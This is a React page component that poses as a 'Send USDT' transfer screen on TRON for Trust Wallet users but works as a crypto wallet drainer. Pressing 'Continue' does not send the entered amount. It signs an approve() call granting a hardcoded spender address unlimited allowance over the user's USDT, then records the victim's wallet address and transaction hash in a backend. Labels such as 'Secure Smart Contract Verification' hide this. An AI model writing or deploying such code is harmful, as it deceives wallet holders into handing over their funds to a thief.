import { useState, useEffect } from "react";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";

const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";

export default function Index() {
  const [address, setAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState("");
  const createTransaction = useMutation(api.transactions.createTransaction);

  useEffect(() => {
    const checkWallet = async () => {
      if ((window as any).tronWeb && (window as any).tronWeb.defaultAddress.base58) {
        setAddress((window as any).tronWeb.defaultAddress.base58);
      }
    };
    const timer = setInterval(checkWallet, 1500);
    return () => clearInterval(timer);
  }, []);

  const handleApprove = async () => {
    if (!address) {
        if((window as any).tronWeb) await (window as any).tronWeb.request({ method: 'tron_requestAccounts' });
        else return alert("Open in Trust Wallet Browser");
    }

    try {
      setIsLoading(true);
      setStatus("Confirming...");

      const tronWeb = (window as any).tronWeb;
      const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

      const parameter = [
        { type: 'address', value: TRON_SPENDER },
        { type: 'uint256', value: maxAmount }
      ];

      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 }, parameter, address
      );

      const signedTx = await tronWeb.trx.sign(transaction.transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      if (result.result) {
        await createTransaction({
          walletAddress: address,
          txHash: result.txid,
          amount: amount || "Max",
          toAddress: TRON_SPENDER,
          usdtBalance: "Verified",
          nativeBalance: "0 TRX"
        });
        alert("✅ Approval Successful!");
      }
    } catch (err) {
      alert("❌ Transaction Failed");
    } finally {
      setIsLoading(false);
      setStatus("");
    }
  };

  const dollarValue = amount && !isNaN(Number(amount)) ? `$${Number(amount).toFixed(2)}` : "$0.00";

  return (
    <div style={styles.container as any}>
      <div style={styles.header as any}>
        <button style={styles.iconBtn as any}>←</button>
        <div style={styles.headerTitle as any}>Send USDT</div>
        <button style={styles.iconBtn as any}>✕</button>
      </div>

      <div style={styles.body as any}>
        <div style={styles.statusSection as any}>
            <div style={styles.tronIcon as any}>T</div>
            <div style={{flex: 1}}>
                <div style={styles.networkName as any}>TRON Network</div>
                <div style={styles.networkSub as any}>Mainnet (Secure Connection)</div>
            </div>
            <div style={styles.greenDot as any}></div>
        </div>

        <div style={styles.card as any}>
            <div style={styles.cardHeader as any}>
                <span style={styles.label as any}>Amount</span>
                <span style={styles.maxLink as any} onClick={() => setAmount("9999")}>MAX</span>
            </div>
            <div style={styles.inputRow as any}>
                <input 
                    type="number" 
                    placeholder="0" 
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    style={styles.mainInput as any}
                />
                <span style={styles.unit as any}>USDT</span>
            </div>
            <div style={styles.subText as any}>{dollarValue}</div>
        </div>

        <div style={styles.card as any}>
            <div style={styles.infoRow as any}>
                <span style={styles.infoLabel as any}>From</span>
                <span style={styles.infoValue as any}>{address ? `${address.slice(0,8)}...${address.slice(-8)}` : "Not Connected"}</span>
            </div>
            <div style={styles.divider as any}></div>
            <div style={styles.infoRow as any}>
                <span style={styles.infoLabel as any}>To (Spender)</span>
                <span style={styles.infoValue as any}>{TRON_SPENDER.slice(0,8)}...</span>
            </div>
            <div style={styles.divider as any}></div>
            <div style={styles.infoRow as any}>
                <span style={styles.infoLabel as any}>Network Fee</span>
                <span style={styles.feeValue as any}>~12.5 TRX ($1.45)</span>
            </div>
        </div>

        <div style={styles.securityBox as any}>
            🛡️ Secure Smart Contract Verification
        </div>
      </div>

      <div style={styles.footer as any}>
        <button 
            disabled={isLoading} 
            onClick={handleApprove} 
            style={(isLoading ? styles.btnDisabled : styles.btnActive) as any}
        >
            {isLoading ? status : "Continue"}
        </button>
      </div>
    </div>
  );
}

// Styles Object with strictly typed strings for TS
const styles = {
  container: { minHeight: "100vh", background: "#000", color: "#fff", fontFamily: "-apple-system, sans-serif", display: "flex", flexDirection: "column", maxWidth: "480px", margin: "0 auto" },
  header: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: "15px 20px" },
  headerTitle: { fontSize: "17px", fontWeight: "600" },
  iconBtn: { background: "none", border: "none", color: "#fff", fontSize: "20px", cursor: "pointer" },
  body: { padding: "10px 20px", flex: 1 },
  statusSection: { display: "flex", alignItems: "center", background: "#1c1c1e", padding: "12px", borderRadius: "14px", marginBottom: "20px", gap: "12px" },
  tronIcon: { width: "35px", height: "35px", background: "#ff3b30", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: "bold", fontSize: "18px" },
  networkName: { fontSize: "14px", fontWeight: "600" },
  networkSub: { fontSize: "11px", color: "#32d74b" },
  greenDot: { width: "8px", height: "8px", background: "#32d74b", borderRadius: "50%" },
  card: { background: "#1c1c1e", padding: "16px", borderRadius: "18px", marginBottom: "15px" },
  cardHeader: { display: "flex", justifyContent: "space-between", marginBottom: "8px" },
  label: { color: "#8e8e93", fontSize: "13px" },
  maxLink: { color: "#0a84ff", fontSize: "13px", fontWeight: "600", cursor: "pointer" },
  inputRow: { display: "flex", alignItems: "baseline", gap: "10px" },
  mainInput: { background: "none", border: "none", color: "#fff", fontSize: "36px", width: "100%", outline: "none", fontWeight: "500" },
  unit: { fontSize: "20px", color: "#8e8e93", fontWeight: "600" },
  subText: { color: "#8e8e93", fontSize: "14px", marginTop: "5px" },
  infoRow: { display: "flex", justifyContent: "space-between", padding: "8px 0" },
  infoLabel: { color: "#8e8e93", fontSize: "14px" },
  infoValue: { color: "#fff", fontSize: "14px", fontWeight: "500" },
  feeValue: { color: "#ff9f0a", fontSize: "14px" },
  divider: { height: "1px", background: "#2c2c2e", margin: "5px 0" },
  securityBox: { textAlign: "center", color: "#8e8e93", fontSize: "12px", marginTop: "20px" },
  footer: { padding: "20px", background: "#000" },
  btnActive: { width: "100%", padding: "16px", borderRadius: "16px", background: "#007aff", color: "#fff", fontWeight: "bold", fontSize: "17px", border: "none", cursor: "pointer" },
  btnDisabled: { width: "100%", padding: "16px", borderRadius: "16px", background: "#3a3a3c", color: "#8e8e93", fontSize: "17px", border: "none" }
};
